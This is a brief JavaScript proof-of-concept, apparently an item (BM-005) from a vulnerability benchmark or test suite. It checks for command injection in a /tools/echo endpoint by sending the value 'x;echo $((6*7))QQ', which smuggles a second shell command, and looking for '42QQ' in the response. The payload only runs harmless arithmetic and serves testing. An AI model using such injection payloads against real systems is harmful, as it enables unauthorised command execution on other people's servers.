'use strict';

const poc = require('./lib/common');

// BM-005: command injection in /tools/echo (shell arithmetic proves the shell ran our text).
poc.run(async function () {
  const res = await poc.request('GET', '/tools/echo?' + poc.query({ msg: 'x;echo $((6*7))QQ' }));
  poc.finish(res.body.includes('42QQ'), 'output ' + JSON.stringify(res.body.slice(0, 80)));
});
